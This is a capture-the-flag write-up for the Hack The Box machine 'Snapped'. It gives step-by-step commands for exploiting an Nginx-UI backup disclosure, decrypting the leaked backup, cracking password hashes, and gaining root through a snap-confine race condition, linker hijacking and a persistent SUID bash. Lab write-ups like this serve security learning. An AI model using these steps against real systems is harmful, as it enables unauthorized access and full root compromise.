# Snapped - Hack The Box Writeup

## Overview

**Snapped** is a hard Linux machine focused on exploiting modern vulnerabilities in Nginx-UI and snapd.

The machine demonstrates:

- CVE-2026-27944 → Unauthenticated Nginx-UI backup disclosure
- CVE-2026-3888 → snap-confine privilege escalation
- TOCTOU race conditions
- Dynamic linker hijacking
- Linux namespace abuse

---

# Enumeration

## Nmap

```bash
nmap -sCV 10.129.242.192
```

### Results

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0
```

Add the domain:

```bash
echo "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
```

---

# Subdomain Enumeration

```bash
ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt \
-u http://FUZZ.snapped.htb -ic
```

### Result

```text
admin
```

Add subdomain:

```bash
echo "10.129.242.192 admin.snapped.htb" | sudo tee -a /etc/hosts
```

---

# Foothold

Visiting:

```text
http://admin.snapped.htb
```

reveals an Nginx-UI login page.

---

# API Enumeration

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-u http://admin.snapped.htb/api/FUZZ -ic
```

### Interesting Endpoints

```text
backup
licenses
```

---

# CVE-2026-27944 — Nginx-UI Backup Disclosure

Download backup:

```bash
curl -OJ http://admin.snapped.htb/api/backup
```

Response headers expose the encryption key and IV:

```text
X-Backup-Security:
Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=:Jky/YQ0ISOX3gcTE9lj7zQ==
```

---

# Backup Decryption

## Decode Key

```bash
key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
```

## Decode IV

```bash
iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)
```

## Extract Backup

```bash
unzip -d backup backup-20260319-121723.zip
```

## Decrypt nginx-ui.zip

```bash
openssl enc -aes-256-cbc -d \
-in nginx-ui.zip \
-out nginxui_decrypted.zip \
-K $key \
-iv $iv
```

Extract decrypted archive:

```bash
unzip nginxui_decrypted.zip
```

---

# Database Enumeration

Open database:

```bash
sqlite3 database.db
```

List tables:

```sql
.tables
```

Dump users:

```sql
select * from users;
```

Two bcrypt hashes are recovered.

---

# Password Cracking

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

Credentials found:

```text
jonathan:linkinpark
```

---

# SSH Access

```bash
ssh jonathan@snapped.htb
```

User access obtained.

---

# Privilege Escalation

## snapd Enumeration

```bash
snap --version
```

### Vulnerable Version

```text
snapd 2.63.1
```

Target is vulnerable to CVE-2026-3888.

---

# Exploitation

## Enter Firefox Sandbox

```bash
env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 \
snap.firefox.hook.configure /bin/bash
```

Inside sandbox:

```bash
cd /tmp
echo $$
```

Save the PID.

---

## Wait for Cleanup

```bash
while test -d ./.snap; do
    touch ./
    sleep 1
done
```

---

## Access Namespace

```bash
cd /proc/<PID>/cwd
```

---

## Destroy Cached Namespace

```bash
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash

env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base snapd \
snap.firefox.hook.configure /nonexistent
```

---

## Compile Exploit

```bash
gcc -O2 -static -o firefox_2404 firefox_2404.c
```

```bash
gcc -nostdlib -static -Wl,--entry=_start \
-o librootshell.so librootshell.c
```

---

## Run Exploit

```bash
~/firefox_2404 ~/payload.so
```

Expected output:

```text
[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE!
```

---

# Dynamic Linker Hijacking

```bash
cp /usr/bin/busybox ./tmp/sh

cat ~/librootshell.so > \
./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

---

# Get Root

```bash
env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 \
snap.firefox.hook.configure /usr/lib/snapd/snap-confine
```

Root shell:

```text
uid=0(root)
```

---

# Sandbox Escape

Persist SUID bash:

```bash
cp /bin/bash /var/snap/firefox/common/bash
chmod 4755 /var/snap/firefox/common/bash
```

Execute:

```bash
/var/snap/firefox/common/bash -p
```

---

# Root Access

```bash
id
```

```text
euid=0(root)
```

---

# Vulnerabilities

| CVE | Description |
|------|-------------|
| CVE-2026-27944 | Unauthenticated Nginx-UI backup disclosure |
| CVE-2026-3888 | snap-confine TOCTOU privilege escalation |

---

# Tools Used

- Nmap
- FFUF
- cURL
- SQLite3
- Hashcat
- OpenSSL
- GCC
- snap-confine

---

# Conclusion

Snapped is an advanced Linux machine combining web exploitation with low-level Linux privilege escalation techniques including race conditions, namespace abuse, and dynamic linker hijacking.
